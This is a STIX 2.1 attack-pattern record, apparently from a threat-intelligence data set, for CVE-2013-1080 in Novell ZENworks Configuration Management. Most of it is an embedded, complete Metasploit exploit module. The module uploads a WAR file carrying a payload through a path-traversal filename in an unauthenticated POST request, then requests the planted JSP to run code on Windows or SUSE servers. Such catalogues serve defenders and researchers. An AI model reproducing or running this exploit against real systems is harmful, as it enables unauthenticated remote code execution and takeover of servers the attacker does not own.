{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--4062cf88-3b1b-423f-a20f-2d4a1cdff5eb",
    "created": "2024-08-14T17:09:59.952289Z",
    "modified": "2024-08-14T17:09:59.952295Z",
    "name": "Novell ZENworks Configuration Management Remote Execution",
    "description": " This module exploits a code execution flaw in Novell ZENworks Configuration Management 10 SP3 and 11 SP2. The vulnerability exists in the ZENworks Control Center application, allowing an unauthenticated attacker to upload a malicious file outside of the TEMP directory and then make a second request that allows for arbitrary code execution. This module has been tested successfully on Novell ZENworks Configuration Management 10 SP3 and 11 SP2 on Windows 2003 SP2 and SUSE Linux Enterprise Server 10 SP3. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/zenworks_control_center_upload.rb",
            "external_id": "zenworks_control_center_upload.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1080"
        },
        {
            "source_name": "reference",
            "url": "http://www.novell.com/support/kb/doc.php?id=7011812"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = GreatRanking\n\n  HttpFingerprint = { :pattern => [ /Apache-Coyote/ ] }\n\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Exploit::EXE\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'        => 'Novell ZENworks Configuration Management Remote Execution',\n      'Description' => %q{\n          This module exploits a code execution flaw in Novell ZENworks Configuration\n        Management 10 SP3 and 11 SP2. The vulnerability exists in the ZENworks Control\n        Center application, allowing an unauthenticated attacker to upload a malicious file\n        outside of the TEMP directory and then make a second request that allows for\n        arbitrary code execution. This module has been tested successfully on Novell\n        ZENworks Configuration Management 10 SP3 and 11 SP2 on Windows 2003 SP2 and SUSE\n        Linux Enterprise Server 10 SP3.\n      },\n      'Author'      =>\n        [\n          'James Burton', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'License'     => MSF_LICENSE,\n      'References'  =>\n        [\n          [ 'CVE', '2013-1080' ],\n          [ 'BID', '58668' ],\n          [ 'OSVDB', '91627' ],\n          [ 'ZDI', '13-049' ],\n          [ 'URL', 'http://www.novell.com/support/kb/doc.php?id=7011812' ]\n        ],\n      'Privileged'  => false,\n      'Platform'    => %w{ linux win },\n      'Targets'     =>\n        [\n          [ 'ZENworks Configuration Management 10 SP3 and 11 SP2 / Windows 2003 SP2',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'win',\n              'Traversal' => '../webapps/'\n            }\n          ],\n          [ 'ZENworks Configuration Management 10 SP3 and 11 SP2 / SUSE Linux Enterprise Server 10 SP3',\n            {\n              'Arch' => ARCH_X86,\n              'Platform' => 'linux',\n              'Traversal' => '../../opt/novell/zenworks/share/tomcat/webapps/'\n            }\n          ]\n        ],\n      'DefaultTarget'  => 1,\n      'DisclosureDate' => '2013-03-22'))\n\n    register_options(\n      [\n        Opt::RPORT(443),\n        OptBool.new('SSL', [true, 'Use SSL', true])\n      ])\n  end\n\n  def check\n    res = send_request_cgi({\n      'method' => 'GET',\n      'uri'    => \"/zenworks/jsp/fw/internal/Login.jsp\"\n    })\n\n    if res and res.code == 200 and res.body =~ /Novell ZENworks Control Center/\n      return Exploit::CheckCode::Detected\n    end\n\n    return Exploit::CheckCode::Detected\n  end\n\n  def exploit\n\n    # Generate the WAR containing the EXE containing the payload\n    app_base = rand_text_alphanumeric(4+rand(4))\n    jsp_name = rand_text_alphanumeric(8+rand(8))\n\n    war_data = payload.encoded_war(:app_name => app_base, :jsp_name => jsp_name).to_s\n\n    print_status(\"Uploading #{war_data.length} bytes as #{app_base}.war ...\")\n\n    # Rex::MIME::Message.new doesn't work fine with binary data, destroys \"\\x0d\" chars\n    boundary = \"----#{rand_text_alpha(34)}\"\n    data = \"--#{boundary}\\r\\n\"\n    data << \"Content-Disposition: form-data; name=\\\"mainPage:_ctrl21a:FindFile:filePathTextBox\\\"; filename=\\\"#{target['Traversal']}#{app_base}.war\\\"\\r\\n\"\n    data << \"Content-Type: application/octet-stream\\r\\n\\r\\n\"\n    data << war_data\n    data << \"\\r\\n\"\n    data << \"--#{boundary}--\"\n\n    res = send_request_cgi(\n      {\n        'method' => 'POST',\n        'uri'    => \"/zenworks/jsp/index.jsp?pageid=newDocumentWizard\",\n        'ctype'  => \"multipart/form-data; boundary=#{boundary}\",\n        'data'   => data\n      })\n\n    if res and res.code == 302\n      print_status(\"Upload finished, waiting 20 seconds for payload deployment...\")\n    else\n      fail_with(Failure::Unknown, \"Failed to upload payload\")\n    end\n\n    # Wait to ensure the uploaded war is deployed\n    select(nil, nil, nil, 20)\n\n    print_status(\"Triggering payload at '/#{app_base}/#{jsp_name}.jsp' ...\")\n    send_request_cgi({\n      'uri'    => normalize_uri(app_base, \"#{jsp_name}.jsp\"),\n      'method' => 'GET',\n    })\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-03-22",
    "x_mitre_platforms": [
        "linux'"
    ]
}